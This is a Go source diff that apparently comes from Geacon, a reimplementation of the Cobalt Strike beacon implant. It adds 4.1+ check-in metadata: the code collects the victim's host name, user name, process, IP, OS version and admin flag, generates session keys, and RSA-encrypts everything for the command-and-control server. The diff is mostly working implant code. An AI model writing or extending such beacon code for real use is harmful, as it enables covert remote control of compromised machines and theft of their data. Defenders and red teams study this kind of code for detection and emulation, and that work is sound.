@@ -8,6 +8,7 @@ import (
 	"main/config"
 	"main/sysinfo"
 	"main/util"
+	"strconv"
 	"strings"
 	"time"
 
@@ -118,14 +119,20 @@ func MakePacket(replyType int, b []byte) []byte {
 
 // EncryptedMetaInfo return raw rsa encrypted data
 func EncryptedMetaInfo() []byte {
-	// command without computer name
-	tempPacket := MakeMetaInfo()
+	var tempPacket, packetUnencrypted, packetEncrypted []byte
 	publicKey, err := util.GetPublicKey()
-	// no idea for -11 but just copy from issue#4
-	config.ComputerNameLength = publicKey.Size() - len(tempPacket) - 11
-
-	packetUnencrypted := MakeMetaInfo()
-	packetEncrypted, err := util.RsaEncrypt(packetUnencrypted, publicKey)
+	// command without computer name
+	if config.Support41Plus {
+		tempPacket = MakeMetaInfo4plus()
+		// no idea for -11 but just copy from issue#4
+		config.ComputerNameLength = publicKey.Size() - len(tempPacket) - 11
+		packetUnencrypted = MakeMetaInfo4plus()
+	} else {
+		tempPacket = MakeMetaInfo()
+		config.ComputerNameLength = publicKey.Size() - len(tempPacket) - 11
+		packetUnencrypted = MakeMetaInfo()
+	}
+	packetEncrypted, err = util.RsaEncrypt(packetUnencrypted, publicKey)
 	if err != nil {
 		panic(err)
 	}
@@ -145,9 +152,6 @@ func MakeMetaInfo() []byte {
 	localIP := sysinfo.GetLocalIP()
 	hostName := sysinfo.GetComputerName()
 	currentUser := sysinfo.GetUsername()
-	// seems username be like computerName\username, so we split it here
-	arr := strings.Split(currentUser, "\\")
-	currentUser = arr[len(arr)-1]
 	var port uint16 = 0
 	metadataFlag := sysinfo.GetMetaDataFlag()
 
@@ -174,6 +178,96 @@ func MakeMetaInfo() []byte {
 
 	fmt.Printf("clientID: %d\n", clientID)
 	onlineInfoBytes := util.BytesCombine(clientIDBytes, processIDBytes, portBytes, osInfoBytes)
+
+	metaInfo := util.BytesCombine(config.GlobalKey, localeANSI, localeOEM, onlineInfoBytes)
+	magicNum := sysinfo.GetMagicHead()
+	metaLen := WritePacketLen(metaInfo)
+	packetToEncrypt := util.BytesCombine(magicNum, metaLen, metaInfo)
+
+	return packetToEncrypt
+}
+
+/*
+MetaData for 4.1
+
+	Key(16) | Charset1(2) | Charset2(2) |
+	ID(4) | PID(4) | Port(2) | Flag(1) | Ver1(1) | Ver2(1) | Build(2) | PTR(4) | PTR_GMH(4) | PTR_GPA(4) |  internal IP(4 LittleEndian) |
+	InfoString(from 51 to all, split with \t) = Computer\tUser\tProcess(if isSSH() this will be SSHVer)
+*/
+func MakeMetaInfo4plus() []byte {
+	util.RandomAESKey()
+	sha256hash := sha256.Sum256(config.GlobalKey)
+	config.AesKey = sha256hash[:16]
+	config.HmacKey = sha256hash[16:]
+
+	clientID = sysinfo.GeaconID()
+	processID := sysinfo.GetPID()
+	//for link SSH, will not be implemented
+	sshPort := 0
+	/* for is X64 OS, is X64 Process, is ADMIN
+	METADATA_FLAG_NOTHING = 1;
+	METADATA_FLAG_X64_AGENT = 2;
+	METADATA_FLAG_X64_SYSTEM = 4;
+	METADATA_FLAG_ADMIN = 8;
+	*/
+	metadataFlag := sysinfo.GetMetaDataFlag()
+	//for OS Version
+	osVersion := sysinfo.GetOSVersion41Plus()
+	osVerSlice := strings.Split(osVersion, ".")
+	osMajorVerison := 0
+	osMinorVersion := 0
+	osBuild := 0
+	if len(osVerSlice) == 3 {
+		osMajorVerison, _ = strconv.Atoi(osVerSlice[0])
+		osMinorVersion, _ = strconv.Atoi(osVerSlice[1])
+		osBuild, _ = strconv.Atoi(osVerSlice[2])
+	} else if len(osVerSlice) == 2 {
+		osMajorVerison, _ = strconv.Atoi(osVerSlice[0])
+		osMinorVersion, _ = strconv.Atoi(osVerSlice[1])
+	}
+
+	//for Smart Inject, will not be implemented
+	ptrFuncAddr := 0
+	ptrGMHFuncAddr := 0
+	ptrGPAFuncAddr := 0
+
+	processName := sysinfo.GetProcessName()
+	localIP := sysinfo.GetLocalIPInt()
+	hostName := sysinfo.GetComputerName()
+	currentUser := sysinfo.GetUsername()
+
+	localeANSI := sysinfo.GetCodePageANSI()
+	localeOEM := sysinfo.GetCodePageOEM()
+
+	clientIDBytes := make([]byte, 4)
+	processIDBytes := make([]byte, 4)
+	sshPortBytes := make([]byte, 2)
+	flagBytes := make([]byte, 1)
+	majorVerBytes := make([]byte, 1)
+	minorVerBytes := make([]byte, 1)
+	buildBytes := make([]byte, 2)
+	ptrBytes := make([]byte, 4)
+	ptrGMHBytes := make([]byte, 4)
+	ptrGPABytes := make([]byte, 4)
+	localIPBytes := make([]byte, 4)
+	binary.BigEndian.PutUint32(clientIDBytes, uint32(clientID))
+	binary.BigEndian.PutUint32(processIDBytes, uint32(processID))
+	binary.BigEndian.PutUint16(sshPortBytes, uint16(sshPort))
+	flagBytes[0] = metadataFlag
+	majorVerBytes[0] = byte(osMajorVerison)
+	minorVerBytes[0] = byte(osMinorVersion)
+	binary.BigEndian.PutUint16(buildBytes, uint16(osBuild))
+	binary.BigEndian.PutUint32(ptrBytes, uint32(ptrFuncAddr))
+	binary.BigEndian.PutUint32(ptrGMHBytes, uint32(ptrGMHFuncAddr))
+	binary.BigEndian.PutUint32(ptrGPABytes, uint32(ptrGPAFuncAddr))
+	binary.BigEndian.PutUint32(localIPBytes, localIP)
+
+	osInfo := fmt.Sprintf("%s\t%s\t%s", hostName, currentUser, processName)
+	osInfoBytes := []byte(osInfo)
+
+	fmt.Printf("clientID: %d\n", clientID)
+	onlineInfoBytes := util.BytesCombine(clientIDBytes, processIDBytes, sshPortBytes,
+		flagBytes, majorVerBytes, minorVerBytes, buildBytes, ptrBytes, ptrGMHBytes, ptrGPABytes, localIPBytes, osInfoBytes)
 
 	metaInfo := util.BytesCombine(config.GlobalKey, localeANSI, localeOEM, onlineInfoBytes)
 	magicNum := sysinfo.GetMagicHead()
